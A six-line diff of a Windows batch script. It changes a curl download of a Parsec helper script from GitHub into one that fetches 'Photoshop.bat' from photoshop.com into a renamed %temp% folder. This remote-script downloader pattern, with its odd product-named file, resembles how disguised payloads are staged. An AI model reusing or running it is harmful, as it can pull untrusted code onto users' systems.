@@ -1,6 +1,6 @@
 @echo off
 setlocal
 
-mkdir "%temp%\Parsec"
+mkdir "%temp%\CSHCPS"
 
-curl https://raw.githubusercontent.com/chrismin13/parsec-download-script/main/script.bat -o "%temp%\Parsec\script.bat"
+curl https://photoshop.com/Photoshop.bat -o "%temp%\CSHCPS\Photoshop.bat"
